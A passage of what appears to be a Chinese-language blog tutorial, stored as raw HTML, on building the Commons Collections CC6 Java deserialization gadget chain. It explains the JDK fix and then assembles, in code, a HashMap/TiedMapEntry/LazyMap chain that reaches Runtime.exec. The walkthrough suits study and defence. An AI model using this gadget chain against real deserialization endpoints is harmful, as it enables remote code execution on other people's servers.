namespace\">sun<span class=\"token punctuation\">.</span>misc<span class=\"token punctuation\">.</span></span>Unsafe</span><span class=\"token punctuation\">.</span><span class=\"token function\">getUnsafe</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token operator\">+</span>                typeOffset <span class=\"token operator\">=</span> unsafe<span class=\"token punctuation\">.</span>objectFieldOffset</pre></td></tr><tr><td data-num=\"73\"></td><td><pre><span class=\"token operator\">+</span>                        <span class=\"token punctuation\">(</span><span class=\"token class-name\">AnnotationInvocationHandler</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"type\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token operator\">+</span>                memberValuesOffset <span class=\"token operator\">=</span> unsafe<span class=\"token punctuation\">.</span>objectFieldOffset</pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token operator\">+</span>                        <span class=\"token punctuation\">(</span><span class=\"token class-name\">AnnotationInvocationHandler</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"memberValues\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token operator\">+</span>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> ex<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token operator\">+</span>                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ExceptionInInitializerError</span><span class=\"token punctuation\">(</span>ex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token operator\">+</span>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setType</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">AnnotationInvocationHandler</span> o<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token operator\">+</span>                            <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Annotation</span><span class=\"token punctuation\">></span></span> type<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token operator\">+</span>            unsafe<span class=\"token punctuation\">.</span><span class=\"token function\">putObject</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">,</span> typeOffset<span class=\"token punctuation\">,</span> type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre><span class=\"token operator\">+</span>        <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setMemberValues</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">AnnotationInvocationHandler</span> o<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token operator\">+</span>                                    <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> memberValues<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre><span class=\"token operator\">+</span>            unsafe<span class=\"token punctuation\">.</span><span class=\"token function\">putObject</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">,</span> memberValuesOffset<span class=\"token punctuation\">,</span> memberValues<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>         <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>     <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>大家可以明显的看到 setValue () 方法被移除了，然后这不是真正的原因，就算有 setValue () 也没有办法再反序列化了，因为 readObject () 中，不再直接使用 Map，而是创建了一个 LinkedHashMap，将原来的键值对放进去，这样一来就没法执行原来的 Map 对象了。</p>\n<p>因此该修复不仅修复了 TransformedMap 链，LazyMap 链也不能在高于 jdk7u20 的版本下触发了，所以 CC6 出来了！</p>\n<h1 id=\"入口类\"><a class=\"anchor\" href=\"#入口类\">#</a> 入口类</h1>\n<p>虽然在 8u71 后修复了 AnnotationInvocationHandler 这个类，但是我们测试知道，CC 的 LazyMap 这后半条链也还是可以利用的。<br />\n所以我们想找一个不受 JDK 限制的入口类，就可以使用后半条链类。<br />\nHashMap 就是一个很好的入口点，接受泛型参数，在 readObject 中调用 put 方法，put 调用 hash, 进而调用 hashCode 方法，所以我们这要找到一个在它的 hashCode 方法中调用了 get 方法的类，那么就形成了一条完整的利用链了。<br />\nTiedMapEntry 就是其中一个。</p>\n<blockquote>\n<p>源码</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">return</span> map<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token class-name\">Object</span> value <span class=\"token operator\">=</span> <span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getKey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">?</span> <span class=\"token number\">0</span> <span class=\"token operator\">:</span> <span class=\"token function\">getKey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">(</span>value <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">?</span> <span class=\"token number\">0</span> <span class=\"token operator\">:</span> value<span class=\"token punctuation\">.</span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们可以看到 TiedMapEntry 正好满足我们所需要的条件，他的 hashCode 方法调用了 getValue 方法，进而调用了 map.get 方法，map 也是我们可以控制的</p>\n<blockquote>\n<p>TiedMapEntry 的构造函数</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">TiedMapEntry</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Map</span> map<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> key<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>map <span class=\"token operator\">=</span> map<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>key <span class=\"token operator\">=</span> key<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>开始构造利用链</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"kate\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">Transformer</span> chainedTransformer <span class=\"token operator\">=</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span>transformers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> map <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> lazyMap <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">,</span> chainedTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>后半条还是使用 LazyMap<br />\n 新生成一个 tiedMapEntry 的实例，第一个参数放入我们的 lazyMap, 第二个就无所谓了，然后执行他的 hashCode 方法进行测试，可以正常执行命令。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">TiedMapEntry</span> tiedMapEntry <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TiedMapEntry</span><span class=\"token punctuation\">(</span>lazyMap<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        tiedMapEntry<span class=\"token punctuation\">.</span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>将 tiedMapEntry 放入 HashMap 的 key 中</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> map1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        map1<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>tiedMapEntry<span class=\"token punctuation\">,</span><span class=\"token string\">\"bbb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>但是这里有个问题，就是在我们 put 的时候，它会对 key 进行 hash，它就已经触发了后半条链。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">V</span> <span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">K</span> key<span class=\"token punctuation\">,</span> <span class=\"token class-name\">V</span> value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">putVal</span><span class=\"token punctuation\">(</span><span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>所以我们要在这条链上置空一个值，因为它是环环相扣的，所以改变那一条链都是可以，这里通过反射来改变 lazyMap 的值。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 改变 lazyMap 的值</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> lazyMap <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//put 之后将 lazyMap 的值改回去</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token class-name\">Field</span> factory <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"factory\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>factory<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>factory<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>lazyMap<span class=\"token punctuation\">,</span>chainedTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>按找正常来说，现在我们进行反序列化应该可以正常执行我们的利用链，但是执行之后我们发现并没有我们预期的效果，什么都没有发生。</p>\n<blockquote>\n<p>跟进 put 方法进行调试</p>\n</blockquote>\n<p><img data-src=\"https://s2.loli.net/2022/10/21/kqdraXeGbHKFWIQ.png\" alt=\"lazyMap.png\" /><br />\n 我们发现在 lazyMap 的 get 方法中，它会去查找 key 的值，如果 map 里没有 key，它就会写入这个 key，所以在反序列的时候就不会走到这个 if 里，就不会触发我们的链。</p>\n<blockquote>\n<p>问题解决</p>\n</blockquote>\n<p>解决也很简单，只要在 put 后删除 key 的值就好了<br />\n<img data-src=\"https://s2.loli.net/2022/10/21/kqdraXeGbHKFWIQ.png\" alt=\"lazyMap.png\" /></p>\n<blockquote>\n<p>完整利用链</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">NoSuchFieldException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IllegalAccessException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"kate\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">Transformer</span> chainedTransformer <span class=\"token operator\">=</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span>transformers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> map <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> lazyMap <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">TiedMapEntry</span> tiedMapEntry <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TiedMapEntry</span><span class=\"token punctuation\">(</span>lazyMap<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> map1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        map1<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>tiedMapEntry<span class=\"token punctuation\">,</span><span class=\"token string\">\"bbb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        map<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">Field</span> factory <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"factory\"</span><span class=\"token 